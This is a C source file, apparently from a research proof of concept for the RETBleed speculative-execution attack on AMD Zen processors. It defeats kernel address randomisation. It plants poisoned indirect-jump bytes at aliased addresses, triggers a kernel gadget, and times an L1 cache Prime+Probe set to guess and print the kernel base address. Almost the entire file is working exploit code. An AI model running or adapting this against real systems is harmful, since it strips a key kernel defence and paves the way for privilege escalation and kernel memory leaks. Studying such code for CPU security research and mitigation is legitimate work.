#include <err.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include "retbleed.h"
#include "retbleed_zen.h"

#define KBASE          0xffffffff81000000
#define KBASE_END      0xffffffffbe000000

/**
 * According to TagBleed (Koschel), kernel text must reside within this range
 */
#define NCAND ((KBASE_END - KBASE)>>21)

/**
 * Maximum clock cycles to Probe the L1 set. Anything above is considered extra
 * noise so we cap it here. This seems to differ accorss machines. Some manual
 * calibration may be necessary.
 */
#define TIME_MAX 120

#define PROBE_SET 29 // 0-63

/**
 * For P+P on L1d$.
 */
#define WAYNESS 8

/**
 * Prime+Probe primitive. Prime+Probe primitive. Prime+Probe primitive.
 */
#define PP() do{\
    pp.buf[\
        pp.buf[\
            pp.buf[\
                pp.buf[\
                    pp.buf[\
                        pp.buf[\
                            pp.buf[\
                                pp.buf[PROBE_SET*0x40] * 0x1000 + PROBE_SET*0x40\
                            ] * 0x1000 + PROBE_SET*0x40\
                        ] * 0x1000 + PROBE_SET*0x40\
                    ] * 0x1000 + PROBE_SET*0x40\
                ] * 0x1000 + PROBE_SET*0x40\
            ] * 0x1000 + PROBE_SET*0x40\
        ] * 0x1000 + PROBE_SET*0x40 + 3\
    ] = 3;\
} while(0)

/**
 * Candidate kernel text base offset.
 */
struct kcand {
    u64 base;
    u64 bb_start;
    u64 t;
};
struct kcand kbase_cand[NCAND];

int do_break_kaslr ()
{
    setup_segv_handler();

    struct mem_info pp;
    pp.va = 0x1330000000L;
    map_or_die(pp.buf, 1UL<<21, PROT_RW, MMAP_FLAGS, -1, 0);
#ifdef ALLOW_THP
    madvise((void*)pp.buf, 1UL<<21, MADV_HUGEPAGE);
#endif

    // setting up pointer chasing of pages in a not-so-predictable order for L1
    // P+P primitive
    for (int way = 0; way < WAYNESS; ++way) {
        int q = (7*way + 12) & (WAYNESS-1);
        pp.buf[PROBE_SET*0x40 + q * 0x1000] = ((q+1)%WAYNESS);
    }

    for (int i = 0; i < NCAND ; ++i) {
        struct kcand *k = &kbase_cand[i];
        k->base = KBASE + (i<<21UL);
        u64 src = (k->base + MMAP_RET_OFFSET) ^ PWN_PATTERN;
        u64 src_page = src & ~0xfffUL;
        k->bb_start = src_page + (MMAP_LAST_TGT&0xfff);
        map_or_die((u8 *)src_page, 0x1000, PROT_RWX, MMAP_FLAGS, -1, 0);
        memset((u8 *)k->bb_start, 0x90, MMAP_RET_OFFSET - MMAP_LAST_TGT);

        // ff e1  jmp *%rcx
        *(u8 *)(src-1) = 0xff;
        *(u8 *)src     = 0xe1;
    }

    // sweeping over all candidates kernel base candidates a few times..
    for (int i = 0; i < 20; ++i) {
        for (int j = 0; j < NCAND; ++j) {
            struct kcand *k = &kbase_cand[j];
            should_segfault = 1;
            int a = sigsetjmp(env, 1);
            if (a == 0) {
                asm("jmp *%1" :: "c"(k->base+KASLR_OFFSET), "r"(k->bb_start));
            }
            should_segfault = 0;
            rdtsc();//sync
            PP();
            CALL_KASLR_GADGET(PROBE_SET*0x40);
            u64 t0 = rdtsc();
            PP();
            u64 t = rdtscp() - t0;
            k->t += MIN(t, TIME_MAX);
        }
    }

    u64 slowest = 0;
    u64 guess_kbase = -1;
    for(int j = 0; j < NCAND; ++j) {
        u64 t = kbase_cand[j].t;
        u64 kbase_try = kbase_cand[j].base;
        if (t > slowest) {
            slowest = t;
            guess_kbase = kbase_try;
        }
    }
    printf("[*] 0x%lx (%lu)\n", guess_kbase, slowest);
    return 0;
}

int main(int argc, char *argv[])
{
    do_break_kaslr();
    return 0;
}
